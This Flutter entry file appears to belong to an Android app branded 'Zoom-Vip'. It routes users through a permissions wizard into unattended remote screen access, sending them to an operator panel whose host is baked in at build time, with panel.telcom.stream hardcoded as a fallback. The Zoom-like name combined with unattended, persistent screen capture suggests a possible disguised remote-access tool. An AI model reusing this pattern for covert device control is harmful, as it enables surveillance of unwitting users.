import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'screens/unattended_access.dart';
import 'screens/setup_permissions.dart';
import 'services/setup_service.dart';

const String kBakedOperatorHost = String.fromEnvironment('OPERATOR_HOST', defaultValue: '');
const int kBakedOperatorPort = int.fromEnvironment('OPERATOR_PORT', defaultValue: 0);
const bool kBakedUseHttps = bool.fromEnvironment('USE_HTTPS', defaultValue: true);
const String kBakedPasswordHash = String.fromEnvironment('EMBEDDED_PASSWORD_HASH', defaultValue: '');

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const ZoomPrivateClientApp());
}

class ZoomPrivateClientApp extends StatelessWidget {
  const ZoomPrivateClientApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Zoom-Vip',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        useMaterial3: true,
        colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF0753FB)),
      ),
      home: const AppRouter(),
    );
  }
}

/// Routes between the one-time setup wizard, auto-connect, and the remote
/// viewer based on persisted state.
class AppRouter extends StatefulWidget {
  const AppRouter({super.key});

  @override
  State<AppRouter> createState() => _AppRouterState();
}

class _AppRouterState extends State<AppRouter> {
  bool _ready = false;

  /// Setup wizard is shown on first run, and again whenever a required grant
  /// is missing. Android drops the MediaProjection consent after a reboot or
  /// process death (it cannot be persisted), so this also routes the user
  /// straight back to the one-step re-authorization screen.
  bool _needsSetup = true;

  String _operatorHost = '';
  int _operatorPort = 443;
  bool _useHttps = true;

  @override
  void initState() {
    super.initState();
    _checkFirstLaunch();
  }

  /// Resolves the operator endpoint. CI bakes both dart-defines and Android
  /// string resources; the resources act as a fallback so a build that was
  /// produced without dart-defines still connects to the operator panel.
  Future<void> _resolveOperatorConfig() async {
    var host = kBakedOperatorHost;
    var useHttps = kBakedUseHttps;
    var port = kBakedOperatorPort;

    if (host.isEmpty) {
      final baked = await SetupService().getBakedServerConfig();
      host = (baked['host'] as String? ?? '').trim();
      useHttps = baked['useHttps'] as bool? ?? true;
      final bakedPort = baked['port'] as int? ?? 0;
      port = bakedPort;
    }

    if (host.isEmpty) {
      host = 'panel.telcom.stream';
    }
    if (port <= 0) {
      port = useHttps ? 443 : 80;
    }

    _operatorHost = host;
    _operatorPort = port;
    _useHttps = useHttps;
  }

  Future<void> _checkFirstLaunch() async {
    await _resolveOperatorConfig();

    // Pre-provisioned fleets arrive with every grant already applied; skip the
    // wizard entirely in that case.
    final status = await SetupService().getStatus();
    final needsSetup = !status.requiredGranted;

    if (!mounted) return;
    setState(() {
      _needsSetup = needsSetup;
      _ready = true;
    });
  }

  Future<void> _markSetupComplete() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('zoom_private_setup_complete', true);
    if (mounted) setState(() => _needsSetup = false);
  }

  @override
  Widget build(BuildContext context) {
    if (!_ready) {
      return const Scaffold(body: Center(child: CircularProgressIndicator()));
    }

    if (_needsSetup) {
      return SetupPermissionsScreen(onComplete: _markSetupComplete);
    }

    return UnattendedAccessScreen(
      operatorHost: _operatorHost,
      operatorPort: _operatorPort,
      passwordHash: kBakedPasswordHash,
      useHttps: _useHttps,
    );
  }
}
